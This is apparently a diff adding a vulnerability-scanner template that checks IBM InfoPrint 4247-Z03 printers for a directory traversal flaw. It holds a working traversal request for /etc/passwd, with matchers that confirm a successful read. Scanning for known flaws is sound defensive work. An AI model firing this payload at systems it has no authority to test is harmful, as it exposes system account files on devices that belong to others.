@@ -1,0 +1,22 @@
+id: ibm-infoprint-lfi
+info:
+  author: Harsh Bothra
+  description: Directory traversal vulnerability on IBM InfoPrint 4247-Z03 Impact
+    Matrix Printer.
+  name: IBM InfoPrint 4247-Z03 Impact Matrix Printer - Directory Traversal
+  reference: https://www.exploit-db.com/exploits/47835
+  severity: medium
+  tags: ibm,lfi
+requests:
+- matchers:
+  - status:
+    - 200
+    type: status
+  - part: body
+    regex:
+    - root:[x*]:0:0
+    type: regex
+  matchers-condition: and
+  method: GET
+  path:
+  - '{{BaseURL}}/./../../../../../../../../../../etc/passwd'
